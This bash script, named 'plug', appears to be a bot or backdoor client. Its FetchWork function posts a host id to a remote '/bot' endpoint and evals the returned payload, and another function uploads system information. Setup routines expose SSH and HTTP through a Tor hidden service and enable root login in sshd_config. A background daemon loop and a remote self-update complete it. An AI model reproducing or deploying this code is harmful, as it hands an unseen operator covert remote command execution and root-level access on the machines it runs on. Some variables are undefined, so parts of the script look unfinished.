#!/bin/bash
#
##############################################################################
#
# plug shell scirpts config
#
##############################################################################

PLUG_Config() {
    export PLUG_APP_NAME='plug'
    export PLUG_APP_URL='http://invidec.net:8000'

    # export PLUG_UPDATE_URL='https://invidec.net/plug/plug.sh'
    export PLUG_UPDATE_URL='http://invidec.net:3000/dave0x3e/plug/raw/master/current.sh'

    export PLUG_DEBUG=false

    export PLUG_PREFIX="PLUG_"

    #PLUG_DEST=/opt/plug
    #PLUG_DEST=~/plug
    #
    PLUG_TEMP_DIR=/tmp/plug
    PLUG_LOCK_DIR=/var/lock/plug
    PLUG_USER=plug
    # PLUG_LOG_FILE=/var/log/plug.log
    PLUG_LOG_FILE=/tmp/plug.log

    # PLUG_LOOP_TIMEOUT=5

    export PLUG_DAEMON_INTERVAL=10

    # PLUG_DEFAULT_AUTHORIZED_KEYS='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxXeZG/Engz5P59E0G7FVp3E8hYeEu9PDowInC7xnQyvV/eK1yV87wrBtorePNvuW50aZOTylz/TshPbQNY7eDW8G4jkKIyBpf09hsXo1cW+pdWsLcA4dvKDdqtQmSW09BmfoDZJDpz/yDu4cChJ1LZuQ4RY7mWHK3EZIXIoSChLlO3SEIBNyARCkPM2EzKG3KZPB2aqHrQW/MjtmFnxsfCv4UDzJ24+S2fOaNWgJNcmxx4sORRT8YrGTEgQgOn1rfYJdZcYsAurdsvUNKkJGpVpFW62ZfU7zfqR48AFITTMqk5c/HSlL/hxZib51CJck5B/ehSvBgdNfk6QoYif2loqN7SCC0cVLb8Mr5RFbtCWe0X9E0vc37m5iFw7p15a5jCKlsBUJsofkue3rx1BUgfqU/rLRzCh/2D0o+eM/pEN0jTmIRBzcHNrvOj0sJLhHj/jjsWEmkg5FWiUiod1okzWT20BOi7NAxXqWxAY0cSp6hgv3VE8RWbrEiXD0/e3U= service@parrot'

    PLUG_TEST_FOR_COMMANDS='bash sh curl wget ssh'

    # following 2 values will get defined by Init
    #PLUG_DEST=''
    #PLUG_TEMP=''

    export PLUG_DAEMON_LOCK_FILE=daemon.lock
    export PLUG_DAEMON_LOG_FILE=daemon.log

    PLUG_DAEMON_INIT_EVAL="echo 'initeval';"
    PLUG_DAEMON_LOOP_EVAL="echo 'loopeval'; "

    PLUG_HOME_DEST=~/.plug
    PLUG_ROOT_DEST=/opt/plug

    PLUG_ROOT_TEMP=/tmp/plug
}
PLUG_Config
# configuration end
###############################################################################

PLUG_LIBRARY_Term() {

    Term_pos() {
        local CURPOS
        read -sdR -p $'\E[6n' CURPOS
        CURPOS=${CURPOS#*[} # Strip decoration characters <ESC>[
        echo "${CURPOS}"    # Return position in "row;col" format
    }
    Term_row() {
        local COL
        local ROW
        IFS=';' read -sdR -p $'\E[6n' ROW COL
        echo "${ROW#*[}"
    }
    Term_col() {
        local COL
        local ROW
        IFS=';' read -sdR -p $'\E[6n' ROW COL
        echo "${COL}"
    }

    Term_hr() {
        eval printf %.0s- '{1..'"${COLUMNS:-$(tput cols)}"\}
        echo
    }
    Terminal_List() {
        for item in $1; do
            echo $item
        done
    }
    Term_clear() {
        clear
    }

    #Usage: Menu <array list options>
    #Example: Menu "aaa bbb ccc" "<title>" "<prompt>"
    Terminal_Menu() {
        echo "$2"
        # let options=$1
        while true; do
            let counter=0
            for item in $1; do
                ((counter++))
                echo "${counter}"') '"${item}"
            done
            echo "0) cancel"

            read -p "Enter your choice:" -n 1 choice
            case $choice in
            0) break ;;
            [1-9])
                echo "1-9"
                break
                ;;
            *) echo "s" ;;
            esac
        done
    }

    # Terminal_Menu "aaa bbb ccc"

    # Terminal_List "aaaa vbbbbbbb asdasdf"
    # Terminal_List "asd" "asdsdf" "asdfdgfdsg"

    # options=("asas" "sadasdf" "asd")
    # Terminal_List "${options[*]}"

    Terminal_CsvList() {
        local IFS_backup=$IFS
        local IFS=,
        for item in $1; do
            echo $item
        done
        local IFS=$IFS_backup
    }

    # Terminal_CsvList "aaaaa,bbbbb,cccc"

    #Usage: Xsleep <seconds>
    Term_Xsleep() {
        duration=$1
        stepping="${2:-1}"
        printf "[$duration]"
        while (($duration)); do
            ((duration -= $stepping))
            sleep $stepping
            printf "."
        done
        printf "\n"
    }
}
PLUG_LIBRARY_SysInfo() {
    SystemCpuArch() {
        arch=$(lscpu | grep 'Architecture' | awk '{print $2}' | head -n 1)
        echo "${arch}"
    }
    SystemCpuModel() {
        cpuModel=$(lscpu | grep 'Model name' | cut -d ' ' -f 3- | sed -e 's/^[[:space:]]*//')
        echo "${cpuModel}"
    }
    SystemCpuCount() {
        cores=$(lscpu | grep 'CPU(s)' | awk '{print $2}' | head -n 1)
        echo "${cores}"
    }
    SystemDistroName() {
        distroName=$(lsb_release -i | awk '{print $3}')
        echo "${distroName}"
    }
    SystemDistroCodename() {
        distroCodeName=$(lsb_release -c | awk '{print $2}')
        echo "${distroCodeName}"
    }
    SystemDistroVersion() {
        distroVersion=$(lsb_release -r | awk '{print $2}')
        echo "${distroVersion}"
    }

}
PLUG_LIBRARY_Setup() {
    # Setup_Temps() {
    #     if [ -d /tmp ]; then
    #         if [ -d /tmp/plug ]

    # }

    function PLUG_Setup_Tor() {
        apt update -y
        apt install -y tor

        systemctl restart tor

        torrcFile=/etc/tor/torrc

        echo 'HiddenServiceDir /var/lib/tor/plug_hidden_service/' >>$torrcFile
        echo 'HiddenServicePort 80 127.0.0.1:80' >>$torrcFile
        echo 'HiddenServicePort 22 127.0.0.1:22' >>$torrcFile

        systemctl enable tor
        systemctl restart tor

        #/etc/init.d/tor restart
        export onionHostname=$(cat /var/lib/tor/plug_hidden_service/hostname)
    }

    function PLUG_Setup_sshd() {
        apt update -y
        apt install openssh-server -y

        systemctl restart ssh

        sshdConfig=/etc/ssh/sshd_config

        echo 'PermitRootLogin yes' >>$sshdConfig
        echo 'PubkeyAuthentication yes' >>$sshdConfig

        systemctl enable ssh
        systemctl restart ssh
    }

    function PLUG_Setup_Tor_SSH_Client() {

        apt update -y && apt install tor ncat -y
    }

    PLUG_Setup_Dependencies() {
        AptInstall() {
            local pkgs=$1
            if ! dpkg -s $pkgs >/dev/null 2>&1; then
                apt-get install $pkgs -y
            fi
        }
        PacmanInstall() {
            local pkgs=$1
            pacman -Sy --noconfirm $pkgs
        }
        # Install.Nodejs() {
        #     echo "install nodejs"
        # }
    }

    SetupCronjob() {
        echo "not implemented yet done"
    }

    PLUG_Setup_ClientSSH() {
        if [ ! -d "$PLUG_DEST/.ssh" ]; then

            mkdir "$PLUG_DEST/.ssh"
            # echo "directory \"$PLUG_DEST/.ssh\" not exists"
            #sudo -u $PLUG_USER
            ssh-keygen -f $PLUG_DEST/.ssh/id_rsa -t rsa -N ""

            #sudo -u $PLUG_USER
            touch $PLUG_DEST/.ssh/authorized_keys
            #echo $AUTHORIZED_KEYS >>$PLUG_DEST/.ssh/authorized_keys
            #sudo -u $PLUG_USER
            touch $PLUG_DEST/.ssh/config

            # sudo -u $PLUG_USER touch $PLUG_DEST/.ssh/shared_rsa
            # sudo -u $PLUG_USER touch $PLUG_DEST/.ssh/shared_rsa.pub

            # sudo -u $PLUG_USER chmod 600 $PLUG_DEST/.ssh/shared_rsa
            # sudo -u $PLUG_USER chmod 600 $PLUG_DEST/.ssh/shared_rsa.pub

            # echo $SSH_CONFIG | base64 -d >>$PLUG_DEST/.ssh/config
            # echo $SHARED_RSA | base64 -d >>$PLUG_DEST/.ssh/shared_rsa
            # echo $SHARED_RSA_PUB >>$PLUG_DEST/.ssh/shared_rsa.pub

        fi
    }
    PLUG_Setup_Hostid() {
        if [ ! -f $PLUG_DEST/hostid ]; then
            #hostid=$(sha256sum /etc/ssh/ssh_host_rsa_key.pub | awk '{print $1}')
            export PLUG_HOSTID=$(md5sum $PLUG_DEST/.ssh/id_rsa.pub | awk '{print $1}')
            Debug Log ShowVariable PLUG_HOSTID
            #echo $hostid
            echo $PLUG_HOSTID | tee $PLUG_DEST/hostid
        else
            export PLUG_HOSTID="$(cat $PLUG_DEST/hostid)"
        fi
        Debug ShowVariable PLUG_HOSTID
    }
}
PLUG_LIBRARY_Setup

# PLUG_LIBRARY_Core() {
#     PLUG_GetDestination() {
#         # Init_Dest
#         if [ $EUID != 0 ]; then
#             #echo 'User not root'
#             PLUG_DEST=$PLUG_HOME_DEST
#         else
#             # echo 'User is root'
#             if [ -d /opt ]; then
#                 PLUG_DEST=$PLUG_ROOT_DEST
#             else
#                 PLUG_DEST=$PLUG_HOME_DEST
#             fi
#         fi
#         echo "$PLUG_DEST"
#     }
# }

PLUG_LIBRARY_Common() {

    Timestamp() {
        date +%s
    }
    DateFormat() {
        date +%Y-%m-%d
    }
    TimeFormat() {
        date +%H:%M:%S
    }
    CmdExists() {
        if [ $(command -v $1) ]; then
            echo "command \"$1\" exists on system"
        fi
    }
    TestCmd() {
        if [ $(command -v $1) ]; then
            echo "true"
        else
            echo "false"
        fi
    }
    CheckCmd() {
        if [ $(command -v $1) ]; then
            false
        else
            true
        fi
    }
    TestCommands() {
        for item in $PLUG_TEST_FOR_COMMANDS; do
            echo "$item=$(TestCmd $item)"
        done
    }

    RequireRoot() {
        # check if running as root
        if [[ $EUID -ne 0 ]]; then
            echo "This script must be run as root"
            sudo -i $0
            exit 1
        fi
    }
    IsRoot() {
        # if CheckCmd "id"; then
        #     if $(id -u) -ne 0
        # fi
        if [[ $EUID -ne 0 ]]; then
            return 1
        else
            return 0
        fi
    }
    CheckRoot() {
        if [[ $EUID -ne 0 ]]; then
            false
        else
            true
        fi
    }

    TestCapable() {
        echo "TestCapable"
        CmdExists "curl"
        CmdExists "wget"
        CmdExists "ssh"
    }

    Uptime() {
        systemUptime=$(uptime -s)
        echo "${systemUptime}"
    }

    Hash_sha256() {
        # echo $(sha256sum $1 | awk '{print $1}')
        echo $(echo $1 | sha256sum | awk '{print $1}')
    }
    Hash_md5() {
        # echo $(md5sum $1 | awk '{print $1}')
        echo $(echo $1 | md5sum | awk '{print $1}')
    }

    CouldMakeDir() {
        mkdir -p $1 &>/dev/null
        return $?
    }

    #Usage: GenerateKey /opt/plug/ssh/id_rsa
    GenerateKey() {
        filePath="${2:-'~/.ssh/id_rsa'}" #/opt/plug/ssh/id_rsa
        echo $filePath
        ssh-keygen -f $filePath -t rsa -N '' &>/dev/null
    }

    Log() {
        # local logLine="["$(Timestamp)"] $1"
        echo $1 | sudo tee -a $PLUG_LOG_FILE
    }
    Log_DT() {
        Log "[$(DateFormat)_$(TimeFormat)] $1"
    }
    Log_UT() {
        Log "[$(Timestamp)] $1"
    }
    Debug() {
        if (($PLUG_DEBUG)); then
            eval $*
            # echo $*
        fi
    }
    ToggleDebug() {
        export PLUG_DEBUG="$((!PLUG_DEBUG))"
        ShowVariable PLUG_DEBUG
    }

    # Debug() {
    #     local timestamp=$(date +%H:%M:%S)
    #     echo "[$timestamp][DEBUG] $1"
    # }

    ShowVariable() { echo "$1"'='$(eval 'echo $'$1); }
    StringPart() { eval "awk '{print $"$1"}'"; }
}
PLUG_LIBRARY_Common

PLUG_LIBRARY_Api() {
    PLUG_API_FetchWork() {
        echo "FetchWork"
        payload=$(curl -s -X POST -d "hostid=$hostid" $APP_URL/bot)
        echo "[payload=$payload]"
        eval $payload
    }

    PLUG_API_SendInfo() {
        echo "SendInfo"
        info="$(uname -a)"
        curl -s -X POST -d "hostid=$hostid" -d "info=$info" $APP_URL/bot/info
        echo "done"
    }
}

PLUG_LIBRARY_Daemon() {

    # pidfile=daemon.pid

    # logfile=daemon.log

    function Daemon_Log() {
        echo "$1" >>$PLUG_DEST/$PLUG_DAEMON_LOG_FILE # arguments are accessible through $1, $2,...
    }

    function Daemon_Stopped() {
        Log_DT "daemon stopped"
    }

    function Daemon_Main() {
        Log_DT "daemon started"

        eval $PLUG_DAEMON_INIT_EVAL

        trap Daemon_Stopped EXIT

        # echo $$ >>$PLUG_DEST/$PLUG_DAEMON_LOCK_FILE
        # for ((i = 0; i < 10; i++)); do
        #     echo "${i}"
        #     sleep 1
        # done
        i=0
        while [ true ]; do
            # body
            ((i++))
            Log_UT "${i} $$"
            eval $PLUG_DAEMON_LOOP_EVAL
            sleep $PLUG_DAEMON_INTERVAL
        done
    }

    function Daemon_Run() {
        echo "Daemon_Run"
        # set +x
        # Daemon_Main &>/dev/null &
        Daemon_Main &>$PLUG_DEST/$PLUG_DAEMON_LOG_FILE &
        # set -x
        bgpid=$!
        echo $bgpid >$PLUG_DEST/$PLUG_DAEMON_LOCK_FILE
        # echo "bgpid=$bgpid"
    }

    function Daemon_IsRunning() {
        if [ -f $PLUG_DEST/$PLUG_DAEMON_LOCK_FILE ]; then
            if pgrep -F $PLUG_DEST/$PLUG_DAEMON_LOCK_FILE >/dev/null; then
                return 0
            fi
        fi
        return 1
    }

    function Daemon_Status() {
        echo "Daemon-Status: "
        if [ -f $PLUG_DEST/$PLUG_DAEMON_LOCK_FILE ]; then
            lastPid=$(cat $PLUG_DEST/$PLUG_DAEMON_LOCK_FILE)
            echo "lastPid=$lastPid"

            if Daemon_IsRunning; then
                echo "daemon is running"

                ps -u -f --forest --ppid $lastPid
            else
                echo "daemon is not running"
            fi
        else
            echo "no pidfile found. daemon not running"
        fi
    }

    function Daemon_Start() {
        echo "Daemon_Start"

        fgpid=$$
        # echo "fgpid=$fgpid"

        if Daemon_IsRunning; then
            echo "daemon already running"
        else
            echo "daemon not running"
            Daemon_Run
        fi

        # echo "main done"
        # ps -u -f --forest --ppid $fgpid
    }

    function Daemon_Stop() {
        if Daemon_IsRunning; then
            echo "stopping the daemon"
            kill $(cat $PLUG_DEST/$PLUG_DAEMON_LOCK_FILE)
        fi
    }

    function Daemon() {
        case "$1" in
        "start")
            Daemon_Start
            ;;
        "stop")
            Daemon_Stop
            ;;
        "restart")
            Daemon_Stop
            Daemon_Start
            ;;
        "status")
            Daemon_Status
            ;;
        *)
            Daemon_Start
            ;;
        esac
    }
}
PLUG_LIBRARY_Daemon

PLUG_InitDest() {
    #    if [[ -z $PLUG_DEST ]]; then

    if IsRoot && [ -d "/opt" ] && CouldMakeDir '/opt/plug'; then
        export PLUG_DEST='/opt/plug'
    # elif IsRoot && [-d "/data/data/com.termux/files/"] && CouldMakeDir "/data/data/com.termux/files/opt/plug"; then
    #     export PLUG_DEST="/data/data/com.termux/files/opt/plug"
    elif CouldMakeDir "$HOME/.plug"; then
        export PLUG_DEST="$HOME/.plug"
    elif CouldMakeDir "$(pwd)/.plug"; then
        export PLUG_DEST="$(pwd)/.plug"
    else
        export PLUG_DEST="$(pwd)"
    fi

    echo "PLUG_DEST=$PLUG_DEST"
}

PLUG_PreInit() {

    PLUG_InitDest

    export PLUG_LOG_FILE="$PLUG_DEST/$PLUG_DAEMON_LOG_FILE"
}

PLUG_Init() {

    # # Get Desitnation Path
    # if [ $EUID != 0 ]; then
    #     echo 'User not root'
    #     PLUG_DEST=$PLUG_HOME_DEST
    # else
    #     echo 'User is root'
    #     if [ -d /opt ]; then
    #         PLUG_DEST=$PLUG_ROOT_DEST
    #     else
    #         PLUG_DEST=$PLUG_HOME_DEST
    #     fi
    # fi
    # echo "PLUG_DEST="$PLUG_DEST

    if [ ! -d $PLUG_DEST ]; then
        echo "$PLUG_DEST does not exists"
        mkdir -v $PLUG_DEST
        touch $PLUG_DEST/config.sh
        echo "$PLUG_DEST/config.sh created"
    else
        echo "$PLUG_DEST found"
        if [ -f $PLUG_DEST/config.sh ]; then
            echo "$PLUG_DEST/config.sh found"
            source $PLUG_DEST/config.sh
            echo "$PLUG_DEST/config.sh loaded"
        else
            echo "$PLUG_DEST/config.sh does not exists"
            touch $PLUG_DEST/config.sh
            echo "$PLUG_DEST/config.sh created"
        fi
    fi

    # Init_Temp
    if [ -z $PLUG_TEMP ]; then
        Debug echo "PLUG_TEMP is not set"

        if [ $(command -v mktemp) ]; then
            Debug echo "command \"mktemp\" exists on system"
            PLUG_TEMP=$(mktemp -d -t plug.XXXXXXXX)
            Debug echo "PLUG_TEMP=$PLUG_TEMP"
            echo "PLUG_TEMP=$PLUG_TEMP" >>$PLUG_DEST/config.sh
        fi
    else
        Debug echo "PLUG_TEMP is set"
        Debug echo "PLUG_TEMP=$PLUG_TEMP"
        if [ ! -d $PLUG_TEMP ]; then
            Debug echo "PLUG_TEMP does not exists"

            if [ $(command -v mktemp) ]; then
                Debug echo "command \"mktemp\" exists on system"
                PLUG_TEMP=$(mktemp -d -t plug.XXXXXXXX)
                Debug echo "PLUG_TEMP=$PLUG_TEMP"
                echo "PLUG_TEMP=$PLUG_TEMP" >>$PLUG_DEST/config.sh
            fi
        fi
    fi

    Debug echo "Init done"
    # echo "PLUG_DEST=$PLUG_DEST"
    # echo "PLUG_TEMP=$PLUG_TEMP"

    # Status

    PLUG_Setup_ClientSSH
    PLUG_Setup_Hostid

    echo "Init Setup done"

    ShowVariable PLUG_HOSTID
}

PLUG_LIBRARY_Misc() {

    Update() {
        echo "Updating"
        echo "$UPDATE_URL"
        curl $PLUG_UPDATE_URL -o $PLUG_TEMP/plug.sh
        cp -rf -v $PLUG_TEMP/plug.sh $PLUG_DEST/plug.sh
        [ ! -x $PLUG_DEST/plug.sh ] && chmod +x $PLUG_DEST/plug.sh
        echo "done"
    }
    Reload() {
        echo "Reloading"
        if [ -f $PLUG_DEST/plug.sh ]; then
            source $PLUG_DEST/plug.sh
        fi
        echo "done"
    }

    ShellInfo() {
        # local info=""
        # Log $info
        echo "processID=$$"
        echo "processArgumentCount=$#"
        echo "processArguments=$?"
        echo "currentShell=$0"
        echo "currentWorkingDir=$(pwd)"
        echo "currentUserId=$(id -u)"
        ShowVariable SCRIPT_NAME
        ShowVariable SCRIPT_DIR
    }

    ShowStatus() {
        echo "ShowStatus: "
        echo ""
        ShowVariable PLUG_DEST
        ShowVariable PLUG_TEMP
        # echo "PLUG_DEST=$PLUG_DEST"
        # echo "PLUG_TEMP=$PLUG_TEMP"
        echo ""
        Daemon status
    }

    PLUG_Banner() {
        echo -en '
    ___________   ______________    ______________
    7     77  7   7  7  77     7    7     77  7  7
    |  -  ||  |   |  |  ||   __!    |  ___!|  !  |
    |  ___!|  !___|  |  ||  !  7    !__   7|     |
    |  7   |     7|  !  ||     |____7     ||  7  |
    !__!   !_____!!_____!!_____!7__7!_____!!__!__!

'
    }

    SystemInfo() {
        cat /proc/cpuinfo
    }

    # RuntimeInfo() {
    #     # echo "RuntimeInfo"
    #     echo '{
    #         "pid":'$$',
    #         "name":"'$0'",
    #         "path":"'$(pwd)'",
    #         "user":"'$USER'"
    #     }'
    # }

    PLUG_StatusMonitor() {
        watch -n 2 "Daemon status"
    }
    PLUG_LogFileViewer() {
        tail -f $PLUG_LOG_FILE
    }
    function PLUG_ListVariables() {
        compgen -v $PLUG_PREFIX
    }

}
PLUG_LIBRARY_Misc

# Work() {
#     hostid=$(uname -a | sha256sum | awk '{print $1}')
#     echo $hostid
#     echo ""
#     timeout=$PLUG_LOOP_TIMEOUT
#     counter=0

#     while true; do
#         ((counter++))
#         payload=$(curl -s -X POST -d "hostid=$hostid" $APP_URL/bot)
#         echo "[counter=$counter, timeout=$timeout, payload=$payload]"
#         eval $payload
#         sleep $timeout
#     done
# }

# Daemon() {
#     PLUG_Init

#     Work
# }

# SCRIPT_NAME="${0}"
# SCRIPT_DIR="${SCRIPT_NAME%/*}"

Main() {
    PLUG_Banner

    Info

    # PLUG_DEST=PLUG_GetDestination
    PLUG_PreInit
    # PLUG_Init
    Daemon start
}

PLUG_Console() {
    echo "Starting PLUG Console"
    function PLUG_Console_bashrc() {
        export PS1="PLUG>"
        source $PLUG_SRC
        complete -W "$(declare -pF | awk '{print $3}')" -I
        # complete -F "$(compgen -v $PLUG_PREFIX)" ShowVariable
        alias e="exit"
        PLUG_PreInit
        PLUG_Banner
    }

    # bash --norc
    bash --rcfile <(
        declare -f PLUG_Console_bashrc
        echo "PLUG_Console_bashrc"
    )
}

function PLUG_Bash() { bash --rcfile <(echo 'source '$PLUG_SRC';'$1'; exit'); }

Test() {
    # let name="${0}"
    # let dir="${SCRIPT_NAME%/*}"

    # echo "${0}"
    # echo "${1}"
    # echo "${*}"

    # echo "a1asdsd"
    # echo $name
    # echo $dir
    echo $SCRIPT_NAME
    echo $SCRIPT_DIR
}

# Initialization begins here
function plug_env_vars_init() {
    case "${0}" in
    "bash" | "/bin/bash")
        # ShowVariable 0
        # ShowVariable BASH_SOURCE
        if [[ -n "${BASH_SOURCE}" ]]; then
            export SCRIPT_NAME="${BASH_SOURCE}"
        fi
        ;;
    *)
        # echo "default (none of above)"
        export SCRIPT_NAME="${0}"
        ;;
    esac

    export SCRIPT_DIR="${SCRIPT_NAME%/*}"
    Debug ShowVariable SCRIPT_NAME
    Debug ShowVariable SCRIPT_DIR
    export PLUG_SRC="$(realpath $SCRIPT_NAME)"
    export PLUG_SRC_NAME="$(basename $PLUG_SRC)"
    export PLUG_SRC_DIR="$(dirname $PLUG_SRC)"
    Debug ShowVariable PLUG_SRC
    Debug ShowVariable PLUG_SRC_NAME
    Debug ShowVariable PLUG_SRC_DIR
    # Base Init done

}
plug_env_vars_init
PLUG_PreInit
PLUG_Init

if [ ! -z $1 ]; then
    case "${1}" in
    s | source | --s | --source)
        # echo "source"
        shift
        ;;
    # dry | dryrun | --dry | --dryrun)
    #     echo "dryrun"
    #     shift
    #     ;;
    status)
        ShowStatus
        ;;
    d)
        echo "daemon"
        Daemon
        ;;
    c)
        # echo "console"
        PLUG_Console
        exit
        ;;
    bash)
        PLUG_Bash "$2"
        exit
        ;;
    m | main)
        Main
        ;;
    *)
        echo "not found"
        ;;
    esac
    # else
    # echo "nothing"
    # echo $0
fi

# if [ -z $0 ]; then

# else

# fi
